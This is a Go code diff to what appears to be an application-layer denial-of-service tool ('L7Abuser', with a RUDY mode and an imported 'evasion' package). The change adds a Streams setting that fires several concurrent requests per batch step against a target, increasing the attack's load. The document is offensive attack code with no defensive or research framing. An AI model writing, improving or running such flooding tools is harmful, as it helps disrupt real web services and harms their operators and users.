@@ -7,6 +7,7 @@ import (
 	"math/rand"
 	"net/http"
 	"strings"
+	"sync"
 	"sync/atomic"
 
 	"github.com/kjsst/sh-mvdos/internal/worker/evasion"
@@ -17,6 +18,7 @@ import (
 type L7Abuser struct {
 	Target    string
 	Workers   int
+	Streams   int // parallel in-flight requests per batch step (non-RUDY)
 	BatchSize int
 	Mode      string
 	CMS       string
@@ -80,6 +82,10 @@ func (w *L7Abuser) runRudyWorker(ctx context.Context, client *http.Client, reqs,
 }
 
 func (w *L7Abuser) runBatchWorker(ctx context.Context, mode string, workerID int, client *http.Client, reqs, errs *atomic.Uint64) {
+	parallel := w.Streams
+	if parallel <= 0 {
+		parallel = 1
+	}
 	for {
 		select {
 		case <-ctx.Done():
@@ -91,11 +97,20 @@ func (w *L7Abuser) runBatchWorker(ctx context.Context, mode string, workerID int
 			if ctx.Err() != nil {
 				return
 			}
-			if err := w.fireOnce(ctx, mode, workerID, j, client); err != nil {
-				errs.Add(1)
-			} else {
-				reqs.Add(1)
+			var wg sync.WaitGroup
+			wg.Add(parallel)
+			for k := 0; k < parallel; k++ {
+				seq := j*parallel + k
+				go func(seq int) {
+					defer wg.Done()
+					if err := w.fireOnce(ctx, mode, workerID, seq, client); err != nil {
+						errs.Add(1)
+					} else {
+						reqs.Add(1)
+					}
+				}(seq)
 			}
+			wg.Wait()
 		}
 	}
 }
